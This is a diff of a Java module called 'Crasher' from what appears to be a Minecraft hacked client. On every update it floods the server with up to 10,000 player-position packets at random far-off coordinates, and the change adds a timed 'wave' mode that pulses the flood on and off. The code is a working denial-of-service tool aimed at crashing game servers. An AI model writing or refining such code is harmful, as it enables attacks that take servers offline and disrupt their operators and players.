@@ -9,8 +9,8 @@ import net.minecraft.util.BlockPos;
 
 public class Crasher extends Module {
 	
-	int loop = 0;
-	public static boolean active;
+	int delay = 0;
+	public static boolean wave = false;
 	
 	public Crasher() {
 		super("Crasher", -1, Category.MISC, false);
@@ -29,8 +29,12 @@ public class Crasher extends Module {
 	}
 	
 	public void onUpdate() {
+		delay++;
+		if (delay >= 200) {
+			delay = 0;
+		}
 		int spam = 0;
-		while (spam < 10000 && (Utils.limite ? Utils.limit > Utils.nbPack : true)) {
+		while (spam < 10000 && (Utils.limite ? Utils.limit > Utils.nbPack : true) && (wave ? delay <= 100 : true)) {
 			mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition((Math.random()*1000000-500000), (Math.random()*100+10), (Math.random()*1000000-500000), true));
 			++spam;
 		}
